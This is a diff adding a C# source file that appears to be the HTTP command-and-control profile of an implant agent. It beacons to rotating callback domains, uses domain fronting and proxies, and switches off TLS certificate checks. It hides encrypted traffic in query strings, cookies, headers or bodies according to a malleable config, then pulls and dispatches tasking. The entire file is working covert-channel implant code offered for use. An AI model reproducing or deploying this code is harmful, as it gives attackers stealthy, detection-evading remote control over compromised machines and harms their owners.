@@ -1,0 +1,335 @@
+using Agent.Interfaces;
+using Agent.Models;
+using Agent.Utilities;
+using System.Net;
+using System.Text.Json;
+using System.Net.Security;
+using System.Text;
+using HttpxTransform;
+using System.Security.Cryptography;
+
+namespace Agent.Profiles
+{
+    public class HttpxProfile : IProfile
+    {
+        public IAgentConfig agentConfig { get; set; }
+        public ICryptoManager crypt { get; set; }
+        private IMessageManager messageManager { get; set; }
+        private ILogger logger { get; set; }
+        private string[] callbackDomains { get; set; }
+        private string domainRotation { get; set; }
+        private int failoverThreshold { get; set; }
+        private int currentDomainIndex = 0;
+        private int failureCount = 0;
+        private Random random = new Random();
+        private HttpxConfig config { get; set; }
+        private HttpClient _client { get; set; }
+        private int timeoutSeconds;
+        private string proxyHost { get; set; }
+        private int proxyPort { get; set; }
+        private string proxyUser { get; set; }
+        private string proxyPass { get; set; }
+        private string domainFront { get; set; }
+        private int currentAttempt = 0;
+        private int maxAttempts = 10;
+        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
+        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
+
+        public HttpxProfile(IAgentConfig agentConfig, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
+        {
+            this.agentConfig = agentConfig;
+            this.crypt = crypto;
+            this.logger = logger;
+            this.messageManager = messageManager;
+            
+            // Parse parameters from config
+            this.callbackDomains = parseCallbackDomains(callback_domains.Split(','));
+            this.domainRotation = domain_rotation;
+            this.failoverThreshold = failover_threshold;
+            this.timeoutSeconds = timeout;
+            this.proxyHost = proxy_host;
+            this.proxyPort = proxy_port;
+            this.proxyUser = proxy_user;
+            this.proxyPass = proxy_pass;
+            this.domainFront = domain_front;
+            
+            // Load malleable profile configuration
+            string rawConfig = decodeBase64Config(raw_c2_config);
+            if (!string.IsNullOrEmpty(rawConfig))
+            {
+                this.config = HttpxConfig.FromJson(rawConfig);
+                this.config.Validate();
+            }
+            else
+            {
+                throw new InvalidOperationException("raw_c2_config is required for httpx profile");
+            }
+            
+            // Setup HttpClient
+            HttpClientHandler handler = new HttpClientHandler();
+            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
+            
+            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyPort > 0)
+            {
+                WebProxy wp = new WebProxy()
+                {
+                    Address = new Uri($"http://{this.proxyHost}:{this.proxyPort}")
+                };
+                
+                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
+                {
+                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
+                }
+                handler.Proxy = wp;
+            }
+            
+            this._client = new HttpClient(handler);
+            this._client.Timeout = TimeSpan.FromSeconds(timeoutSeconds);
+            
+            if (!string.IsNullOrEmpty(this.domainFront))
+            {
+                this._client.DefaultRequestHeaders.Host = this.domainFront;
+            }
+        }
+        
+        private string[] parseCallbackDomains(string[] domains)
+        {
+            return domains.Select(d => d.Trim()).ToArray();
+        }
+        
+        private string decodeBase64Config(string configData)
+        {
+            if (string.IsNullOrEmpty(configData)) return "";
+            
+            try
+            {
+                byte[] data = Convert.FromBase64String(configData);
+                return System.Text.Encoding.UTF8.GetString(data);
+            }
+            catch
+            {
+                return configData; // Not base64, use as-is
+            }
+        }
+        
+        private string getCurrentDomain()
+        {
+            if (callbackDomains == null || callbackDomains.Length == 0)
+            {
+                return "https://example.com:443"; // Default fallback
+            }
+            
+            switch (domainRotation.ToLower())
+            {
+                case "round-robin":
+                    currentDomainIndex = (currentDomainIndex + 1) % callbackDomains.Length;
+                    return callbackDomains[currentDomainIndex];
+                    
+                case "random":
+                    return callbackDomains[random.Next(callbackDomains.Length)];
+                    
+                case "fail-over":
+                default:
+                    return callbackDomains[currentDomainIndex];
+            }
+        }
+        
+        private void handleDomainFailure()
+        {
+            failureCount++;
+            if (failureCount >= failoverThreshold)
+            {
+                currentDomainIndex = (currentDomainIndex + 1) % callbackDomains.Length;
+                failureCount = 0;
+            }
+        }
+        
+        private void handleDomainSuccess()
+        {
+            failureCount = 0;
+        }
+
+        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        {
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
+            {
+                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+
+                if (!string.IsNullOrEmpty(res))
+                {
+                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
+
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
+        }
+
+        public async Task StartBeacon()
+        {
+            this.cancellationTokenSource = new CancellationTokenSource();
+            while (!cancellationTokenSource.Token.IsCancellationRequested)
+            {
+                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
+                try
+                {
+                    string responseString = await this.Send(messageManager.GetAgentResponseString());
+
+                    if (String.IsNullOrEmpty(responseString))
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                    if (gtr == null)
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    this.currentAttempt = 0;
+
+                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+
+                    this.SetTaskingReceived(null, tra);
+                }
+                catch (Exception e)
+                {
+                    this.currentAttempt++;
+                }
+
+                if (this.currentAttempt >= this.maxAttempts)
+                {
+                    this.cancellationTokenSource.Cancel();
+                }
+            }
+        }
+        
+        internal async Task<string> Send(string json)
+        {
+            try
+            {
+                // Encrypt the message
+                json = this.crypt.Encrypt(json);
+                byte[] messageBytes = Encoding.UTF8.GetBytes(json);
+
+                // Select HTTP method variation based on message size
+                VariationConfig variation = null;
+                if (messageBytes.Length > 500)
+                {
+                    variation = config.GetVariation("post") ?? config.GetVariation("put") ?? config.GetVariation("patch");
+                    if (variation == null || string.IsNullOrEmpty(variation.Verb) || variation.Uris == null || variation.Uris.Count == 0)
+                    {
+                        variation = config.GetVariation("get");
+                    }
+                }
+                else
+                {
+                    variation = config.GetVariation("get") ?? config.GetVariation("head") ?? config.GetVariation("options");
+                    if (variation == null || string.IsNullOrEmpty(variation.Verb) || variation.Uris == null || variation.Uris.Count == 0)
+                    {
+                        variation = config.GetVariation("post");
+                    }
+                }
+
+                // Apply client transforms
+                byte[] transformedData = TransformChain.ApplyClientTransforms(messageBytes, variation.Client.Transforms);
+
+                // Build URL
+                string domain = getCurrentDomain();
+                string uri = variation.Uris[random.Next(variation.Uris.Count)];
+                string url = domain + uri;
+
+                // Handle message placement
+                string queryParam = "";
+                byte[] requestBodyBytes = null;
+                
+                switch (variation.Client.Message.Location.ToLower())
+                {
+                    case "query":
+                        if (variation.Client.Parameters != null)
+                        {
+                            foreach (var param in variation.Client.Parameters)
+                            {
+                                if (!string.IsNullOrEmpty(queryParam))
+                                    queryParam += "&";
+                                queryParam += $"{param.Key}={Uri.EscapeDataString(param.Value)}";
+                            }
+                        }
+                        if (!string.IsNullOrEmpty(queryParam))
+                            queryParam += "&";
+                        queryParam += $"{variation.Client.Message.Name}={Encoding.UTF8.GetString(transformedData)}";
+                        url = url.Split('?')[0] + "?" + queryParam;
+                        break;
+                        
+                    case "body":
+                        requestBodyBytes = transformedData;
+                        break;
+                }
+
+                // Create HTTP request
+                HttpRequestMessage request = new HttpRequestMessage(new HttpMethod(variation.Verb), url);
+                
+                // Add headers
+                foreach (var header in variation.Client.Headers)
+                {
+                    request.Headers.Add(header.Key, header.Value);
+                }
+                
+                // Handle cookie and header placement
+                switch (variation.Client.Message.Location.ToLower())
+                {
+                    case "cookie":
+                        request.Headers.Add("Cookie", $"{variation.Client.Message.Name}={Uri.EscapeDataString(Encoding.UTF8.GetString(transformedData))}");
+                        break;
+
+                    case "header":
+                        request.Headers.Add(variation.Client.Message.Name, Encoding.UTF8.GetString(transformedData));
+                        break;
+                }
+                
+                // Add body if needed
+                if (requestBodyBytes != null && requestBodyBytes.Length > 0)
+                {
+                    request.Content = new ByteArrayContent(requestBodyBytes);
+                }
+
+                // Send request
+                HttpResponseMessage response = await this._client.SendAsync(request, cancellationTokenSource.Token);
+                response.EnsureSuccessStatusCode();
+
+                // Handle success
+                handleDomainSuccess();
+
+                // Read response
+                byte[] responseBytes = await response.Content.ReadAsByteArrayAsync();
+                
+                // Apply server transforms (reverse)
+                byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
+                
+                string responseString = Encoding.UTF8.GetString(untransformedData);
+                
+                // Decrypt
+                return this.crypt.Decrypt(responseString);
+            }
+            catch
+            {
+                handleDomainFailure();
+                return String.Empty;
+            }
+        }
+
+        public bool StopBeacon()
+        {
+            this.cancellationTokenSource.Cancel();
+            return true;
+        }
+    }
+}
+
